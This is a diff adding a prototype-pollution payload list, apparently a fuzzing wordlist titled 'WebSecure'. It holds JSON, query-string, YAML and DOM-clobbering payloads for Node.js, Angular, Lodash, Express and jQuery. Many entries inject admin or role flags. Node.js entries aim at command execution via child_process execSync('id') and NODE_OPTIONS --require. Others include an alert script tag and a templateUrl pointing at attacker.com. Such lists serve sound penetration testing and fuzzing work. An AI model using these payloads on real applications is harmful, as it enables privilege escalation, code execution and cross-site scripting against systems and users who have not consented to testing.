@@ -1,0 +1,136 @@
+# Prototype Pollution Payloads — WebSecure
+# JSON | Query String | Deep Merge | Framework-Specific | DOM | Node.js | Angular | Lodash
+
+# ── BASIC JSON PROTOTYPE POLLUTION ──
+{"__proto__": {"polluted": "yes"}}
+{"__proto__": {"admin": true}}
+{"__proto__": {"isAdmin": true}}
+{"__proto__": {"role": "admin"}}
+{"__proto__": {"authorized": true}}
+{"__proto__": {"debug": true}}
+{"__proto__": {"toString": "polluted"}}
+{"__proto__": {"hasOwnProperty": "polluted"}}
+{"constructor": {"prototype": {"polluted": "yes"}}}
+{"constructor": {"prototype": {"admin": true}}}
+{"constructor": {"prototype": {"isAdmin": true}}}
+{"constructor": {"prototype": {"role": "admin"}}}
+{"constructor": {"prototype": {"authorized": true}}}
+{"prototype": {"polluted": "yes"}}
+{"__proto__": {"__proto__": {"admin": true}}}
+
+# ── QUERY STRING POLLUTION ──
+__proto__[polluted]=yes
+__proto__[admin]=true
+__proto__[isAdmin]=true
+__proto__[role]=admin
+__proto__[authorized]=true
+__proto__[debug]=true
+__proto__[toString]=polluted
+constructor[prototype][polluted]=yes
+constructor[prototype][admin]=true
+constructor[prototype][isAdmin]=true
+constructor[prototype][role]=admin
+constructor[prototype][authorized]=true
+__proto__.polluted=yes
+__proto__.admin=true
+__proto__.isAdmin=true
+constructor.prototype.polluted=yes
+constructor.prototype.admin=true
+
+# ── NESTED / DEEP MERGE ──
+{"a": {"__proto__": {"polluted": "yes"}}}
+{"a": {"b": {"__proto__": {"polluted": "yes"}}}}
+{"a": {"b": {"c": {"__proto__": {"polluted": "yes"}}}}}
+{"data": {"__proto__": {"admin": true}}}
+{"user": {"__proto__": {"role": "admin"}}}
+{"config": {"__proto__": {"debug": true}}}
+{"settings": {"constructor": {"prototype": {"admin": true}}}}
+{"options": {"__proto__": {"polluted": "yes"}}}
+{"params": {"constructor": {"prototype": {"authorized": true}}}}
+
+# ── NODE.JS SPECIFIC ──
+{"__proto__": {"shell": "node"}}
+{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ"}}
+{"__proto__": {"env": {"NODE_OPTIONS": "--require /dev/stdin"}}}
+{"__proto__": {"main": "/etc/passwd"}}
+{"__proto__": {"exports": {"exec": "id"}}}
+{"__proto__": {"argv": ["node", "-e", "process.mainModule.require('child_process').execSync('id')"]}}
+{"__proto__": {"execPath": "/bin/sh"}}
+{"__proto__": {"stdio": "pipe"}}
+{"__proto__": {"cwd": "/tmp"}}
+{"__proto__": {"env": {"PATH": "/tmp:/usr/bin:/bin"}}}
+
+# ── ANGULAR SPECIFIC ──
+{"__proto__": {"bypassSecurityTrustHtml": "polluted"}}
+{"__proto__": {"allowedUnsafeMethods": ["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS"]}}
+{"constructor": {"prototype": {"bypassSecurityTrust": true}}}
+{"__proto__": {"ngTemplate": "<script>alert(1)</script>"}}
+{"__proto__": {"templateUrl": "//attacker.com/template.html"}}
+
+# ── LODASH / UNDERSCORE SPECIFIC ──
+{"__proto__": {"polluted": "yes"}}
+{"a.__proto__": {"polluted": "yes"}}
+{"a[__proto__]": {"polluted": "yes"}}
+{"path": ["__proto__", "polluted"], "value": "yes"}
+{"path": ["constructor", "prototype", "polluted"], "value": "yes"}
+
+# ── EXPRESS.JS / KOA SPECIFIC ──
+{"__proto__": {"query": {"admin": "true"}}}
+{"__proto__": {"render": "polluted"}}
+{"__proto__": {"locals": {"admin": true}}}
+{"__proto__": {"settings": {"views": "/etc"}}}
+{"__proto__": {"view engine": "ejs"}}
+{"__proto__": {"source": "polluted"}}
+
+# ── DOM CLOBBERING ──
+<a id="__proto__">
+<a id="constructor">
+<form id="__proto__"><input name="polluted" value="yes">
+<form id="constructor"><input name="prototype"><input name="polluted" value="yes">
+<img name="__proto__" src="x">
+<div id="__proto__" polluted="yes">
+
+# ── IFRAME / DOCUMENT ──
+document.__proto__.constructor.prototype.polluted = 'yes'
+Object.prototype.polluted = 'yes'
+({}).constructor.prototype.polluted = 'yes'
+({}).__proto__.polluted = 'yes'
+
+# ── URL PARAMETER VARIANTS ──
+?__proto__[polluted]=yes
+?__proto__[admin]=true
+?constructor[prototype][polluted]=yes
+?__proto__[role]=admin
+?__proto__[debug]=1
+?a[__proto__][polluted]=yes
+?a[b][__proto__][polluted]=yes
+?__proto__.polluted=yes
+
+# ── JSON PATH VARIANTS ──
+{"__proto__": {}}
+{"__proto__": null}
+{"__proto__": {"valueOf": {}}}
+{"__proto__": {"toString": {}}}
+{"__proto__": {"toJSON": {}}}
+{"__proto__": {"__defineGetter__": {}}}
+{"__proto__": {"__defineSetter__": {}}}
+
+# ── DESERIALIZATION-TRIGGERED POLLUTION ──
+{"type": "user", "__proto__": {"admin": true}}
+{"class": "config", "__proto__": {"debug": true}}
+{"model": "product", "constructor": {"prototype": {"price": 0}}}
+
+# ── FRAMEWORK-SPECIFIC (jQuery/jQuery.extend) ──
+$.extend(true, {}, JSON.parse('{"__proto__": {"polluted": "yes"}}'))
+$.extend(true, {}, {"__proto__": {"polluted": "yes"}})
+$.extend({}, {"__proto__": {"polluted": "yes"}})
+
+# ── YAML POLLUTION ──
+__proto__:
+  polluted: yes
+constructor:
+  prototype:
+    polluted: yes
+a:
+  __proto__:
+    polluted: yes
